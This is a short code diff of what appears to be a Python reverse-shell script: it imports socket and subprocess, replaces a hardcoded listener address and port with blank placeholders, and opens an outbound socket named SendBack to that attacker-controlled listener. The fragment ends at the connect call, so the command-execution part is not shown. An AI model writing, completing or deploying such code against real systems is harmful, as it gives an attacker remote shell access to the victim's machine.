@@ -4,8 +4,8 @@ import socket
 import subprocess
 
 
-LHOST = '10.195.100.153'
-LPORT = 5555
+LHOST = '' # add ip address listner
+LPORT = int() # add poer
 
 SendBack=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 SendBack.connect((LHOST,LPORT))
